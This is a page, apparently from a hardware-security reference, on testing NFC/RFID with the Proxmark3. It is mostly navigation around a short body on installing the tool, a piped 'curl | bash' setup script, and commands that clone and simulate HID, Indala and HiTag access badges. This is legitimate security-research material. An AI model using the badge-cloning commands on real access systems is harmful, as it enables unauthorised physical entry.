  <a href="#hid-card-format" class="md-nav__link">
    <span class="md-ellipsis">
      HID card format
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-an-hid-card" class="md-nav__link">
    <span class="md-ellipsis">
      Write an HID card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforce-an-hid-reader" class="md-nav__link">
    <span class="md-ellipsis">
      Bruteforce an HID reader
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-desfire" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare DESFire
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-ultra-light" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Ultra Light
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Ultra Light">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#chinese-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      Chinese backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simulate" class="md-nav__link">
    <span class="md-ellipsis">
      Simulate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-classic-1k" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Classic 1k
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Classic 1k">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#darkside-attack-prng-weak" class="md-nav__link">
    <span class="md-ellipsis">
      Darkside attack (PRNG Weak)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nested-attack-prng-weak" class="md-nav__link">
    <span class="md-ellipsis">
      Nested attack (PRNG Weak)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardnested-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Hardnested attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-acronyms" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - Acronyms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-gen-2" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - GEN 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-gen-1a" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - GEN 1a
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unbricking-chinese-magic-mifare-classic" class="md-nav__link">
    <span class="md-ellipsis">
      Unbricking Chinese Magic Mifare Classic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#key-bruteforcedictionary-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Key Bruteforce/Dictionary attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-and-read-sectors" class="md-nav__link">
    <span class="md-ellipsis">
      Write and read sectors
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dump-mifare-card" class="md-nav__link">
    <span class="md-ellipsis">
      Dump Mifare card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simulate-and-emulate-mifare-card" class="md-nav__link">
    <span class="md-ellipsis">
      Simulate and emulate Mifare card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitm-attack" class="md-nav__link">
    <span class="md-ellipsis">
      MITM attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reader-only-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Reader only attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#read-a-mifare-dump" class="md-nav__link">
    <span class="md-ellipsis">
      Read a Mifare Dump
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-classic-4k" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Classic 4k
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Classic 4k">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#chinese-magic-mifare-classic-4k" class="md-nav__link">
    <span class="md-ellipsis">
      Chinese Magic Mifare Classic 4K
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-vigik" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Vigik
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#replay-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Replay Attacks
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relay-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Relay Attack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../spi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SPI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../upnp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    UPnP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../usb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    USB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../zigbee/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZigBee
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_16" >
        
          
          <label class="md-nav__link" for="__nav_7_16" id="__nav_7_16_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Wifi
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_16_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_16">
            <span class="md-nav__icon md-icon"></span>
            Wifi
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wifi/wifi-basics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wifi - Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wifi/wifi-corporate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wifi - Enterprise Network
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wifi/wifi-other/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wifi - Additional Tricks and Tools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wifi/wifi-wep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wifi - WEP Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wifi/wifi-wpa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wifi - WPA Cracking
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Radio frequency
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Radio frequency
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../radio-frequency/limesdr-bts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GSM Network: LimeSDR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../radio-frequency/sdr/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SDR
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Secure boot
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Secure boot
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../secure-boot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Secure Boot
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Side channel
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Side channel
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../side-channel/fault-injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Fault Injection
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#install-and-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      Install and configuration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Install and configuration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#update-and-flash" class="md-nav__link">
    <span class="md-ellipsis">
      Update and flash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#notes-about-card-types" class="md-nav__link">
    <span class="md-ellipsis">
      Notes about card types
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lf-hid-indala" class="md-nav__link">
    <span class="md-ellipsis">
      LF - HID &amp; Indala
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lf-em410x" class="md-nav__link">
    <span class="md-ellipsis">
      LF - EM410X
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hid-example-card" class="md-nav__link">
    <span class="md-ellipsis">
      HID : Example - Card
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HID : Example - Card">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hid-card-format" class="md-nav__link">
    <span class="md-ellipsis">
      HID card format
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-an-hid-card" class="md-nav__link">
    <span class="md-ellipsis">
      Write an HID card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforce-an-hid-reader" class="md-nav__link">
    <span class="md-ellipsis">
      Bruteforce an HID reader
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-desfire" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare DESFire
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-ultra-light" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Ultra Light
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Ultra Light">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#chinese-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      Chinese backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simulate" class="md-nav__link">
    <span class="md-ellipsis">
      Simulate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-classic-1k" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Classic 1k
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Classic 1k">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#darkside-attack-prng-weak" class="md-nav__link">
    <span class="md-ellipsis">
      Darkside attack (PRNG Weak)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nested-attack-prng-weak" class="md-nav__link">
    <span class="md-ellipsis">
      Nested attack (PRNG Weak)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardnested-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Hardnested attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-acronyms" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - Acronyms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-gen-2" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - GEN 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-chinese-card-gen-1a" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Chinese Card - GEN 1a
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unbricking-chinese-magic-mifare-classic" class="md-nav__link">
    <span class="md-ellipsis">
      Unbricking Chinese Magic Mifare Classic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#key-bruteforcedictionary-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Key Bruteforce/Dictionary attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-and-read-sectors" class="md-nav__link">
    <span class="md-ellipsis">
      Write and read sectors
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dump-mifare-card" class="md-nav__link">
    <span class="md-ellipsis">
      Dump Mifare card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simulate-and-emulate-mifare-card" class="md-nav__link">
    <span class="md-ellipsis">
      Simulate and emulate Mifare card
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitm-attack" class="md-nav__link">
    <span class="md-ellipsis">
      MITM attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reader-only-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Reader only attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#read-a-mifare-dump" class="md-nav__link">
    <span class="md-ellipsis">
      Read a Mifare Dump
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-mifare-classic-4k" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Mifare Classic 4k
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HF - Mifare Classic 4k">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#chinese-magic-mifare-classic-4k" class="md-nav__link">
    <span class="md-ellipsis">
      Chinese Magic Mifare Classic 4K
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hf-vigik" class="md-nav__link">
    <span class="md-ellipsis">
      HF - Vigik
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#replay-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Replay Attacks
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relay-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Relay Attack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
	
                  

  
    <a href="https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/protocols/rfid-nfc.md" title="Edit this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/swisskyrepo/HardwareAllTheThings/raw/main/docs/protocols/rfid-nfc.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg>
    </a>
  


<h1 id="nfc-rfid">NFC - RFID</h1>
<blockquote>
<p>Radio Frequency Identification (RFID) &amp; Near Field Communication (NFC)</p>
</blockquote>
<h2 id="install-and-configuration">Install and configuration</h2>
<p>Dependencies to install first</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">sudo</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">p7zip</span> <span class="n">git</span> <span class="n">build-essential</span> <span class="n">libreadline5</span> <span class="n">libreadline-dev</span> <span class="n">libusb</span><span class="p">-</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">4</span> <span class="n">libusb-dev</span> <span class="n">libqt4-dev</span> <span class="n">perl</span> <span class="n">pkg-config</span> <span class="nb">wget </span><span class="n">libncurses5-dev</span> <span class="n">gcc-arm-none-eabi</span> <span class="n">libstdc</span><span class="p">++</span><span class="n">-arm-none-eabi-newlib</span> <span class="n">ncurses-dev</span> <span class="n">libpcsclite-dev</span> <span class="n">pcscd</span>
</code></pre></div>
<p>Cloning and building the tool.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Proxmark</span><span class="p">/</span><span class="n">proxmark3</span><span class="p">.</span><span class="n">git</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">cd </span><span class="n">proxmark3</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">make</span> <span class="n">clean</span> <span class="p">&amp;&amp;</span> <span class="n">make</span> <span class="n">all</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">dmesg</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-i</span> <span class="n">usb</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="p">~/</span><span class="n">proxmark3</span><span class="p">/</span><span class="n">client</span><span class="p">/</span><span class="n">proxmark3</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">ttyACM0</span>
</code></pre></div>
<ul>
<li>Ubuntu : <code>curl https://raw.githubusercontent.com/daveio/attacksurface/master/proxmark3/pm3-setup.sh | bash</code></li>
<li>Kali : <code>Same script should work, just replace Ubuntu 14.04 by Kali</code></li>
</ul>
<p>Testing the tool with the commands <code>hw tune</code> and <code>hw version</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hw</span> <span class="n">tune</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">Measuring</span> <span class="n">antenna</span> <span class="n">characteristics</span><span class="p">,</span> <span class="n">please</span> <span class="n">wait</span><span class="p">.........</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c"># LF antenna: 73.70 V @   125.00 kHz</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c"># LF antenna: 59.12 V @   134.00 kHz</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c"># LF optimal: 73.97 V @   126.32 kHz</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c"># HF antenna: 29.32 V @    13.56 MHz</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hw</span> <span class="n">version</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="n">Prox</span><span class="p">/</span><span class="n">RFID</span> <span class="n">mark3</span> <span class="n">RFID</span> <span class="n">instrument</span>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">uC</span><span class="p">:</span> <span class="n">AT91SAM7S256</span> <span class="n">Rev</span> <span class="n">D</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="n">Embedded</span> <span class="n">Processor</span><span class="p">:</span> <span class="n">ARM7TDMI</span>
</code></pre></div>
<p>If the <code>ACR122</code> doesn't work properly, try <code>sudo rmmod pn533_usb</code></p>
<h3 id="update-and-flash">Update and flash</h3>
<p>In order to update and flash your proxmark you have to kill the <code>ModemManager</code> process as it is interfering with the process.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">ps </span><span class="n">-aux</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">ModemManager</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">kill </span><span class="no">[pid]</span> <span class="p">-</span> <span class="n">on</span> <span class="n">my</span> <span class="n">system</span> <span class="n">stable</span> <span class="n">521</span>
</code></pre></div>
<p>By default the compilation makefile will target the Proxmark rdv4, to make a firmware and boot image for the Proxmark3 Easy you need to edit the <code>Makefile.platform</code> from <code>PLATFORM=PM3RDV4</code> to <code>PLATFORM=PM3OTHER</code>.</p>
<table>
<thead>
<tr>
<th>PLATFORM</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td>PM3RDV4 (def)</td>
<td>Proxmark3 rdv4</td>
</tr>
<tr>
<td>PM3OTHER</td>
<td>Proxmark3 generic target</td>
</tr>
</tbody>
</table>
<p>The compilation steps are as follows.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">make</span> <span class="n">armsrc</span><span class="p">/</span><span class="n">obj</span><span class="p">/</span><span class="n">fullimage</span><span class="p">.</span><span class="n">elf</span> <span class="n">bootrom</span><span class="p">/</span><span class="n">obj</span><span class="p">/</span><span class="n">bootrom</span><span class="p">.</span><span class="n">elf</span> <span class="n">client</span><span class="p">/</span><span class="n">flasher</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">./</span><span class="n">client</span><span class="p">/</span><span class="n">flasher</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">ttyACM0</span> <span class="n">-b</span> <span class="n">bootrom</span><span class="p">/</span><span class="n">obj</span><span class="p">/</span><span class="n">bootrom</span><span class="p">.</span><span class="n">elf</span> <span class="n">armsrc</span><span class="p">/</span><span class="n">obj</span><span class="p">/</span><span class="n">fullimage</span><span class="p">.</span><span class="n">elf</span>
</code></pre></div>
<h2 id="notes-about-card-types">Notes about card types</h2>
<ul>
<li><strong>MIFARE Classic 1K/4K</strong>: basically just a memory storage device. This memory, either 1024 or 4096 bytes, is divided into sectors and blocks. Most of the time used for regular access badges and has really simple security mechanisms for access control</li>
<li><strong>MIFARE Ultralight</strong>: a 64 bytes version of MIFARE Classic. It’s low costs make it widely used as disposable tickets for events or transportation.</li>
<li><strong>MIFARE Plus</strong>: announced as a replacement of MIFARE Classic. The Plus subfamily brings the new level of security up to 128-bit AES encryption.</li>
<li><strong>MIFARE DESFire</strong>: those tags come pre-programmed with a general purpose DESFire operating system which offers a simple directory structure and files, and are the type of MIFARE offering the highest security levels.</li>
</ul>
<h2 id="lf-hid-indala">LF - HID &amp; Indala</h2>
<blockquote>
<p>Cloning requires writable T55xx card. The T55x7 card can be configured to emulate many of the 125 kHz tags.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">lf</span> <span class="n">search</span>               <span class="c"># HID Prox TAG ID: 2004263f88</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">lf</span> <span class="n">hid</span> <span class="n">fskdemod</span>         <span class="c"># (Push the button on the PM3 to stop scanning - not necessary)</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">lf</span> <span class="n">hid</span> <span class="n">demod</span>            <span class="c"># (Push the button on the PM3 to stop scanning - not necessary)</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">lf</span> <span class="n">hid</span> <span class="n">clone</span> <span class="n">2004263f88</span> <span class="c"># (id à cloner)</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">lf</span> <span class="n">hid</span> <span class="n">sim</span> <span class="n">200671012d</span>   <span class="c"># simulate HID card with UID=200671012d</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">lf</span> <span class="n">indala</span> <span class="n">read</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">lf</span> <span class="n">indala</span> <span class="n">demod</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="n">lf</span> <span class="n">indala</span> <span class="n">sim</span> <span class="n">a0000000c2c436c1</span>   <span class="c"># simulate Indala with UID=a0000000c2c436c1</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="n">lf</span> <span class="n">indala</span> <span class="n">clone</span> <span class="n">a0000000c2c436c1</span> <span class="c"># clone Indala to T55x7 card</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">lf</span> <span class="n">hitag</span> <span class="n">info</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="n">lf</span> <span class="n">hitag</span> <span class="n">sim</span> <span class="n">c378181c_a8f7</span><span class="p">.</span><span class="n">ht2</span>   <span class="c"># simulate HiTag</span>
</code></pre></div>
<h2 id="lf-em410x">LF - EM410X</h2>
<p>Read only memory :/</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">Proxmark</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">em4x</span> <span class="n">em410xread</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">EM410x</span> <span class="n">Tag</span> <span class="n">ID</span><span class="p">:</span> <span class="n">23004d4dee</span>
